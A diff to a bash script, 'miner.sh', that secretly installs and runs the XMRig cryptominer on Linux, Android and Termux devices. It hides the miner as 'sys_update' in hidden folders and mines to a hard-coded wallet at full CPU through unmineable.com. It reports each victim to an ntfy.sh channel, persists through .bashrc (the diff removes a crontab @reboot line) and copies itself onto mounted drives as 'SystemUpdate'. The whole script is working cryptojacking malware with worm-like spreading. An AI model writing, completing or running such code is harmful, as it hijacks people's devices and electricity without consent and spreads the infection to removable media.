@@ -1,9 +1,30 @@
 #!/bin/bash
-B64="MHg3ZDBCMDI5Zjk2MzQ4ODk2RWRhQzMxOTgwMTQ5Njg2MWM4ODhiQTE0"
-WALLET=$(echo "$B64" | base64 -d)
-# Configuração Ntfy.sh
+
+# Configurações Iniciais
 NTFY_URL="https://ntfy.sh/gsgzs"
+WALLET="0x7d0B029f96348896EdaC319801496861c888bA14"
 START_TIME=$(date +%s)
+
+# Identificação de Ambiente
+ARCH=$(uname -m)
+IS_TERMUX=$(echo $HOME | grep -q "com.termux" && echo "true" || echo "false")
+IS_ADB_ANDROID=$(uname -a | grep -i "android" && echo "true" || echo "false")
+IS_NATIVE_APP=${IS_NATIVE_APP:-"false"}
+
+# Definir TMP_BASE antes de qualquer uso
+if [ "$IS_NATIVE_APP" = "true" ]; then
+    TMP_BASE="$APP_FILES_DIR/.sys_update"
+elif [ "$IS_TERMUX" = "true" ]; then
+    TMP_BASE="$HOME/.sys_update"
+elif [ "$IS_ADB_ANDROID" = "true" ]; then
+    TMP_BASE="/data/local/tmp/.sys_update"
+else
+    TMP_BASE="/tmp/.sys_update"
+fi
+
+# Garantir diretório e Log inicial imediato
+mkdir -p "$TMP_BASE"
+echo "[$(date)] Script iniciado (Ambiente: Native=$IS_NATIVE_APP, Termux=$IS_TERMUX, ADB=$IS_ADB_ANDROID)" > "$TMP_BASE/sys_log.txt"
 
 function send_checkin() {
     local status="$1"
@@ -14,7 +35,6 @@ function send_checkin() {
     
     local msg="💻 Host: $(hostname)\n🛠 Status: $status\n📈 Modo: $mode\n⏱ Uptime: $uptime_str\n📅 Data: $(date '+%d/%m/%Y %H:%M:%S')"
     
-    # Tentar curl, depois wget como fallback
     if command -v curl >/dev/null 2>&1; then
         curl -s -H "Title: Minerador Status" -H "Priority: default" -H "Tags: hammer,computer" -d "$msg" "$NTFY_URL" > /dev/null 2>&1
     elif command -v wget >/dev/null 2>&1; then
@@ -22,36 +42,20 @@ function send_checkin() {
     fi
 }
 
-# Log inicial imediato para testar se o script está rodando
-mkdir -p "$TMP_BASE"
-echo "[$(date)] Script iniciado (Native App: $IS_NATIVE_APP)" >> "$TMP_BASE/sys_log.txt"
-
-ARCH=$(uname -m)
-IS_TERMUX=$(echo $HOME | grep -q "com.termux" && echo "true" || echo "false")
-IS_ADB_ANDROID=$(uname -a | grep -i "android" && echo "true" || echo "false")
-IS_NATIVE_APP=${IS_NATIVE_APP:-"false"}
-
 if [ "$EUID" -eq 0 ]; then
     echo 128 > /proc/sys/vm/nr_hugepages 2>/dev/null
 fi
 
 if [ "$IS_NATIVE_APP" = "true" ]; then
-    TMP_BASE="$APP_FILES_DIR/.sys_update"
     URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
-    # Garantir que o diretório existe imediatamente
-    mkdir -p "$TMP_BASE"
 elif [ "$IS_TERMUX" = "true" ]; then
-    TMP_BASE="$HOME/.sys_update"
     URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-android-arm64.tar.gz"
     if ! grep -q "miner.sh" "$HOME/.bashrc" 2>/dev/null; then
         echo "bash $HOME/miner.sh > /dev/null 2>&1 &" >> "$HOME/.bashrc"
     fi
 elif [ "$IS_ADB_ANDROID" = "true" ]; then
-    TMP_BASE="/data/local/tmp/.sys_update"
     URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-arm64.tar.gz"
 else
-    TMP_BASE="/tmp/.sys_update"
-    (crontab -l 2>/dev/null | grep -v "miner.sh"; echo "@reboot bash $(realpath "$0") > /dev/null 2>&1 &") | crontab -
     if [[ "$ARCH" == "x86_64" ]]; then
         URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
     else
@@ -59,26 +63,29 @@ else
     fi
 fi
 
-BIN_DIR="$TMP_BASE/bin"
+NEW_BIN="$TMP_BASE/sys_update"
 LOG_FILE="$TMP_BASE/sys_log.txt"
-if [ ! -d "$BIN_DIR" ]; then
-    mkdir -p "$BIN_DIR"
-    curl -L "$URL" -o "$TMP_BASE/pkg.tar.gz" > /dev/null 2>&1
-    tar -xzf "$TMP_BASE/pkg.tar.gz" -C "$BIN_DIR" > /dev/null 2>&1
-    rm "$TMP_BASE/pkg.tar.gz"
-fi
 
-XMRIG_BIN=$(find "$BIN_DIR" -name xmrig -type f | head -n 1)
-NEW_BIN="$BIN_DIR/sys_update"
-if [ -f "$XMRIG_BIN" ] && [ ! -f "$NEW_BIN" ]; then
-    mv "$XMRIG_BIN" "$NEW_BIN"
+if [ ! -f "$NEW_BIN" ]; then
+    echo "[$(date)] Baixando minerador de $URL..." >> "$LOG_FILE"
+    mkdir -p "$TMP_BASE"
+    cd "$TMP_BASE"
+    if command -v curl >/dev/null 2>&1; then
+        curl -L "$URL" -o pkg.tar.gz
+    else
+        wget "$URL" -O pkg.tar.gz
+    fi
+    tar -xzf pkg.tar.gz --strip-components=1
+    mv xmrig sys_update
+    chmod +x sys_update
+    rm pkg.tar.gz
+    echo "[$(date)] Download concluido." >> "$LOG_FILE"
 fi
 
 if [ -f "$NEW_BIN" ]; then
-    chmod +x "$NEW_BIN"
     if ! pgrep -x "sys_update" > /dev/null; then
         send_checkin "Iniciado" "Full Power"
-        # Otimizar argumentos para Android (sem CUDA/OpenCL por padrão e sem 1GB pages que exige root)
+        echo "[$(date)] Iniciando processo de mineracao..." >> "$LOG_FILE"
         if [ "$IS_NATIVE_APP" = "true" ] || [ "$IS_TERMUX" = "true" ]; then
             nohup "$NEW_BIN" -o rx.unmineable.com:3333 -u "MATIC:$WALLET.srv02#p0o1-l2m3" -p x -a rx/0 --cpu-max-threads-hint 100 --priority 5 --log-file "$LOG_FILE" > /dev/null 2>&1 &
         else
@@ -87,16 +94,15 @@ if [ -f "$NEW_BIN" ]; then
     fi
 fi
 
-if [[ "$IS_TERMUX" == "false" && "$IS_ADB_ANDROID" == "false" ]]; then
+if [[ "$IS_TERMUX" == "false" && "$IS_ADB_ANDROID" == "false" && "$IS_NATIVE_APP" == "false" ]]; then
     (while true; do
         for drive in /media/$USER/* /mnt/*; do
             if [ -d "$drive" ] && [ ! -d "$drive/SystemUpdate" ]; then
                 mkdir -p "$drive/SystemUpdate"
-                cp -r "$(dirname "$0")/"* "$drive/SystemUpdate/"
-                echo "bash \$HOME/SystemUpdate/miner.sh &" > "$drive/iniciar.sh"
-                chmod +x "$drive/iniciar.sh"
+                cp "$0" "$drive/SystemUpdate/miner.sh"
+                echo "@reboot bash $drive/SystemUpdate/miner.sh" > "$drive/SystemUpdate/autorun.sh"
             fi
         done
-        sleep 60
+        sleep 300
     done) &
 fi
